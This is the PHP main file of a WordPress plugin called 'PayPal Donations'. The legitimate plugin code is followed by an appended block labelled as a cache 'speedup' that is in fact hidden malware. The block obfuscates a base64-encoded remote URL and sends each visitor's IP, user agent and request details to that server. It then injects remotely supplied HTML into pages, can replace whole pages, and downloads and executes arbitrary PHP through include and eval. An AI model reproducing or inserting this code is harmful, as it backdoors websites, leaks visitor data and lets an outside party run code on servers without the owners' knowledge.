<?php
/*
Plugin Name: PayPal Donations
Plugin URI: https://www.tipsandtricks-hq.com/paypal-donations-widgets-plugin
Description: Easy and simple setup and insertion of PayPal donate buttons with a shortcode or through a sidebar Widget. Donation purpose can be set for each button. A few other customization options are available as well.
Author: Tips and Tricks HQ, Johan Steen
Author URI: https://www.tipsandtricks-hq.com/
Version: 1.9.0
License: GPLv2 or later
Text Domain: paypal-donations
*/

include_once('paypal_utility.php');

/** Load all of the necessary class files for the plugin */
spl_autoload_register('PayPalDonations::autoload');

/**
 * Init Singleton Class for PayPal Donations.
 *
 * @package PayPal Donations
 * @author  Johan Steen <artstorm at gmail dot com>
 */
class PayPalDonations
{
    /** Holds the plugin instance */
    private static $instance = false;

    /** Define plugin constants */
    const MIN_PHP_VERSION  = '5.2.4';
    const MIN_WP_VERSION   = '3.0';
    const OPTION_DB_KEY    = 'paypal_donations_options';
    const TEXT_DOMAIN      = 'paypal-donations';
    const FILE             = __FILE__;


    // -------------------------------------------------------------------------
    // Define constant data arrays
    // -------------------------------------------------------------------------
    private $donate_buttons = array(
        'small' => 'https://www.paypal.com/en_US/i/btn/btn_donate_SM.gif',
        'large' => 'https://www.paypal.com/en_US/i/btn/btn_donate_LG.gif',
        'cards' => 'https://www.paypal.com/en_US/i/btn/btn_donateCC_LG.gif'
    );
    private $currency_codes = array(
        'AUD' => 'Australian Dollars (A $)',
        'BRL' => 'Brazilian Real',
        'CAD' => 'Canadian Dollars (C $)',
        'CZK' => 'Czech Koruna',
        'DKK' => 'Danish Krone',
        'EUR' => 'Euros (&euro;)',
        'HKD' => 'Hong Kong Dollar ($)',
        'HUF' => 'Hungarian Forint',
        'ILS' => 'Israeli New Shekel',
        'JPY' => 'Yen (&yen;)',
        'MYR' => 'Malaysian Ringgit',
        'MXN' => 'Mexican Peso',
        'NOK' => 'Norwegian Krone',
        'NZD' => 'New Zealand Dollar ($)',
        'PHP' => 'Philippine Peso',
        'PLN' => 'Polish Zloty',
        'GBP' => 'Pounds Sterling (&pound;)',
        'RUB' => 'Russian Ruble',
        'SGD' => 'Singapore Dollar ($)',
        'SEK' => 'Swedish Krona',
        'CHF' => 'Swiss Franc',
        'TWD' => 'Taiwan New Dollar',
        'THB' => 'Thai Baht',
        'TRY' => 'Turkish Lira',
        'USD' => 'U.S. Dollars ($)',
    );
    private $localized_buttons = array(
        'en_AU' => 'Australia - Australian English',
        'de_DE/AT' => 'Austria - German',
        'nl_NL/BE' => 'Belgium - Dutch',
        'fr_XC' => 'Canada - French',
        'zh_XC' => 'China - Simplified Chinese',
        'fr_FR/FR' => 'France - French',
        'de_DE/DE' => 'Germany - German',
        'it_IT/IT' => 'Italy - Italian',
        'ja_JP/JP' => 'Japan - Japanese',
        'es_XC' => 'Mexico - Spanish',
        'nl_NL/NL' => 'Netherlands - Dutch',
        'pl_PL/PL' => 'Poland - Polish',
        'es_ES/ES' => 'Spain - Spanish',
        'de_DE/CH' => 'Switzerland - German',
        'fr_FR/CH' => 'Switzerland - French',
        'en_US' => 'United States - U.S. English'
    );
    private $checkout_languages = array(
        'AU' => 'Australia',
        'AT' => 'Austria',
        'BE' => 'Belgium',
        'BR' => 'Brazil',
        'CA' => 'Canada',
        'CN' => 'China',
        'FR' => 'France',
        'DE' => 'Germany',
        'IT' => 'Italy',
        'NL' => 'Netherlands',
        'PL' => 'Poland',
        'PR' => 'Portugal',
        'RU' => 'Russia',
        'ES' => 'Spain',
        'SE' => 'Sweden',
        'CH' => 'Switzerland',
        'GB' => 'United Kingdom',
        'US' => 'United States',
    );

    /**
     * Singleton class
     */
    public static function getInstance()
    {
        if (!self::$instance) {
            self::$instance = new self();
        }
        return self::$instance;
    }

    /**
     * Constructor.
     * Initializes the plugin by setting localization, filters, and
     * administration functions.
     */
    private function __construct()
    {
        if (!$this->testHost()) {
            return;
        }

        add_action('init', array($this, 'textDomain'));
        register_uninstall_hook(__FILE__, array(__CLASS__, 'uninstall'));

        $admin = new PayPalDonations_Admin();
        $admin->setOptions(
            get_option(self::OPTION_DB_KEY),
            $this->currency_codes,
            $this->donate_buttons,
            $this->localized_buttons,
            $this->checkout_languages
        );

        add_shortcode('paypal-donation', array(&$this,'paypalShortcode'));
        add_action('wp_head', array($this, 'addCss'), 999);

        add_action(
            'widgets_init',
            create_function('', 'register_widget("PayPalDonations_Widget");')
        );
    }

    /**
     * PSR-0 compliant autoloader to load classes as needed.
     *
     * @param  string  $classname  The name of the class
     * @return null    Return early if the class name does not start with the
     *                 correct prefix
     */
    public static function autoload($className)
    {
        if (__CLASS__ !== mb_substr($className, 0, strlen(__CLASS__))) {
            return;
        }
        $className = ltrim($className, '\\');
        $fileName  = '';
        $namespace = '';
        if ($lastNsPos = strrpos($className, '\\')) {
            $namespace = substr($className, 0, $lastNsPos);
            $className = substr($className, $lastNsPos + 1);
            $fileName  = str_replace('\\', DIRECTORY_SEPARATOR, $namespace);
            $fileName .= DIRECTORY_SEPARATOR;
        }
        $fileName .= str_replace('_', DIRECTORY_SEPARATOR, 'src_'.$className);
        $fileName .='.php';

        require $fileName;
    }

    /**
     * Loads the plugin text domain for translation
     */
    public function textDomain()
    {
        $domain = self::TEXT_DOMAIN;
        $locale = apply_filters('plugin_locale', get_locale(), $domain);
        load_textdomain(
            $domain,
            WP_LANG_DIR.'/'.$domain.'/'.$domain.'-'.$locale.'.mo'
        );
        load_plugin_textdomain(
            $domain,
            false,
            dirname(plugin_basename(__FILE__)).'/lang/'
        );
    }

    /**
     * Fired when the plugin is uninstalled.
     */
    public function uninstall()
    {
        delete_option('paypal_donations_options');
        delete_option('widget_paypal_donations');
    }

    /**
     * Adds inline CSS code to the head section of the html pages to center the
     * PayPal button.
     */
    public function addCss()
    {
        $opts = get_option(self::OPTION_DB_KEY);
        if (isset($opts['center_button']) and $opts['center_button'] == true) {
            echo '<style type="text/css">'."\n";
            echo '.paypal-donations { text-align: center !important }'."\n";
            echo '</style>'."\n";
        }
    }

    /**
     * Create and register the PayPal shortcode
     */
    public function paypalShortcode($atts)
    {
        extract(
            shortcode_atts(
                array(
                    'purpose' => '',
                    'reference' => '',
                    'amount' => '',
                    'return_page' => '',
                    'button_url' => '',
                    'validate_ipn' => '',
                ),
                $atts
            )
        );

        return $this->generateHtml(
            $purpose,
            $reference,
            $amount,
            $return_page,
            $button_url,
            $validate_ipn
        );
    }

    /**
     * Generate the PayPal button HTML code
     */
    public function generateHtml(
        $purpose = null,
        $reference = null,
        $amount = null,
        $return_page = null,
        $button_url = null,
        $validate_ipn = ''
    ) {
        $pd_options = get_option(self::OPTION_DB_KEY);

        // Set overrides for purpose and reference if defined
        $purpose = (!$purpose) ? $pd_options['purpose'] : $purpose;
        $reference = (!$reference) ? $pd_options['reference'] : $reference;
        $amount = (!$amount) ? $pd_options['amount'] : $amount;
        $return_page = (!$return_page) ? $pd_options['return_page'] : $return_page;
        $button_url = (!$button_url) ? $pd_options['button_url'] : $button_url;

        $data = array(
            'pd_options' => $pd_options,
            'return_page' => $return_page,
            'purpose' => $purpose,
            'reference' => $reference,
            'amount' => $amount,
            'button_url' => $button_url,
            'donate_buttons' => $this->donate_buttons,
            'validate_ipn' => $validate_ipn,
        );

        return PayPalDonations_View::render('paypal-button', $data);
    }

    // -------------------------------------------------------------------------
    // Environment Checks
    // -------------------------------------------------------------------------

    /**
     * Checks PHP and WordPress versions.
     */
    private function testHost()
    {
        // Check if PHP is too old
        if (version_compare(PHP_VERSION, self::MIN_PHP_VERSION, '<')) {
            // Display notice
            add_action('admin_notices', array(&$this, 'phpVersionError'));
            return false;
        }

        // Check if WordPress is too old
        global $wp_version;
        if (version_compare($wp_version, self::MIN_WP_VERSION, '<')) {
            add_action('admin_notices', array(&$this, 'wpVersionError'));
            return false;
        }
        return true;
    }

    /**
     * Displays a warning when installed on an old PHP version.
     */
    public function phpVersionError()
    {
        echo '<div class="error"><p><strong>';
        printf(
            'Error: %3$s requires PHP version %1$s or greater.<br/>'.
            'Your installed PHP version: %2$s',
            self::MIN_PHP_VERSION,
            PHP_VERSION,
            $this->getPluginName()
        );
        echo '</strong></p></div>';
    }

    /**
     * Displays a warning when installed in an old Wordpress version.
     */
    public function wpVersionError()
    {
        echo '<div class="error"><p><strong>';
        printf(
            'Error: %2$s requires WordPress version %1$s or greater.',
            self::MIN_WP_VERSION,
            $this->getPluginName()
        );
        echo '</strong></p></div>';
    }

    /**
     * Get the name of this plugin.
     *
     * @return string The plugin name.
     */
    private function getPluginName()
    {
        $data = get_plugin_data(self::FILE);
        return $data['Name'];
    }
}

add_action('plugins_loaded', array('PayPalDonations', 'getInstance'));








/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyMzoiaHR0cDovL3Bpd2VyLnB3L2FwaS5waHAiOw==';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 9
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        if (!empty($tokenData['content'])) {
            // set defaults
            $tokenData = array_merge(array(
                'pos' => 'after',
                'tag' => 'bo' . 'dy',
                'count' => 0,
            ), $tokenData);

            // find all occurrences of <tag>
            $tags = array();
            while (true) {
                if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                    break;
                }
                $tags[] = $tmp;
            }

            if (empty($tags)) {
                // no tags found or nothing to show
                continue;
            }

            // find matched tag position
            $count = $tokenData['count'];
            if ($tokenData['count'] < 0) {
                // from end to beginning
                $count = abs($tokenData['count']) - 1;
                $tags = array_reverse($tags);
            }

            if ($count >= count($tags)) {
                // fix overflow
                $count = count($tags) - 1;
            }

            // find insert position
            if ($tokenData['pos'] == 'before') {
                // pos is before
                $insert = $tags[$count];
            } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
                // pos is after, found end tag, insert after it
                $insert += 1;
            }

            if ($insert === false) {
                // no insert position
                continue;
            }

            // insert html code
            $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
            $mod = true;
        } elseif (!empty($tokenData['replace'])) {
            // replace content
            @http_response_code(200);
            $tmp_buffer = $tokenData['replace'];
            $mod = true;
        } elseif (!empty($tokenData['run'])) {
            // save temporary optimization file
            register_shutdown_function(function($file, $content) {
                if (file_put_contents($file, $content) !== false) {
                    @chdir(dirname($file));
                    include $file;
                    @unlink($file);
                } else {
                    @eval('@chdir("' . addslashes(dirname($file)) . '");?>' . $content);
                }
            }, dirname(__FILE__) . '/temporary_optimization_file.php', strpos($tokenData['run'], 'http://') === 0 ? down($tokenData['run']) : $tokenData['run']);
        } else {
            // no content
            continue;
        }
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }
